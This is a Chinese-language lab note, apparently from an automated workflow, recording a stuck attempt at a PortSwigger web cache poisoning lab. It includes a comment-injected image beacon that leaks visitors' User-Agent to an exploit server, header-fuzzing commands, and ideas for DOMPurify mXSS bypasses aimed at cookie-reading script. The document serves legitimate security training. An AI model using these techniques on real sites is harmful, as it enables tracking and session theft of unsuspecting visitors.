---
title: "lab-web-cache-poisoning-targeted-using-an-unknown-header"
links:
  - target: cache-poisoning-family
    relation: evidences
---

# lab-web-cache-poisoning-targeted-using-an-unknown-header

> evidences: [[cache-poisoning-family]]

- 题面:Targeted web cache poisoning using an unknown header(/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header)
- 实例:https://0a9f00c803a92d6681950cad009d008e.h1-web-security-academy.net
- 利用服务器:https://exploit-0a1500da03162df481780bf101a1001f.exploit-server.net
- 判定目标:投毒缓存,使**特定子集**(目标访客)浏览器执行 `alert(document.cookie)`
- 状态:**stuck**(超 15min 上限;未决面在本档)

## 已确认的行为

1. `/post?postId=N` 与 `/post/comment?postId=N`(评论 JSON)均 **可缓存**(`max-age=30`)且带 **`Vary: User-Agent`**。
2. 评论由 `loadComments.js` 渲染:body 经 **DOMPurify 2.0.15**
   `sanitize(body,{ALLOWED_TAGS:['b','i','u','img','a'],ALLOWED_ATTR:['src','href']})` →
   `<img src=x onerror=…>` 的 `onerror` 被剥(Chrome 实测只剩 `<img src="x">`)。
   `website` 经 setAttribute + innerHTML 重解析,但序列化会把 `"` 转义 → 无属性逃逸;`avatar` 被 escapeHTML。
3. 访客 **User-Agent 已拿到**(评论里放 `<img src="…/leak">` 当信标):
   `Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36`,
   每 ~18s 访问一次(可以此 UA 作为投毒键)。
4. 新件 `header_fuzz` 对 `/post?postId=5` 与 `/post/comment?postId=5` 枚举 24 个候选头:
   **无任何反射 / 长度或状态差异**(全 `X-Cache: hit`,同长度)→ 未发现额外未键控头。

## 未决面

- 「unknown header」未定位:候选头枚举无反射;可能需更大字典(或该头只影响服务端分支而不回显)。
- XSS 载荷未定:body 受 DOMPurify 2.0.15([b,i,u,img,a]/[src,href])约束,需一个能**穿 DOMPurify** 的 mXSS payload;
  已知 CVE-2020-26870 类 payload 依赖 math/style 命名空间,多半被白名单剥掉。
- 下一步候选:补足头字典(cf. Param Miner 词表)重跑 `header_fuzz`;对 DOMPurify 2.0.15 试 mXSS 变体;
  用访客 UA 作为缓存键 + `poison_loop` 投毒评论 JSON。

## 证据摘录

```
GET /post?postId=2 -> 200,vary: User-Agent,X-Cache: hit
GET /post/comment?postId=1 -> JSON 评论(含我们发的 body/website 原文)
Chrome 渲染 /post?postId=2 -> <p><img src="x"></p>(onerror 已剥)
exploit log: 10.0.3.45 "GET /leak" ... "user-agent: Mozilla/5.0 (Victim) … Chrome/154.0.0.0 …"
header_fuzz <post>/<comment> (24 头) -> hits:[]
```

## 复现命令

```
lab_page "https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header" --out /tmp/b7-4.html
lab_launch launch D6F044FD123351C4A58CF52862CE204541864A727F83FCA937A5EBE40542A162 --widget-source /web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header --jar /tmp/mar-jar.json
lab_http post "<inst>/post/comment" --form csrf=<csrf> --form postId=1 --form 'comment=<img src="https://exploit-<id>.exploit-server.net/leak">' --form name=x --form email=x@x.com --form website= --jar /tmp/mar-jar.json
header_fuzz "<inst>/post?postId=5" --marker zq7marker
```

新件:`header_fuzz`(逐头带 marker 请求,回反射/长度/状态差异 + X-Cache/Vary)。
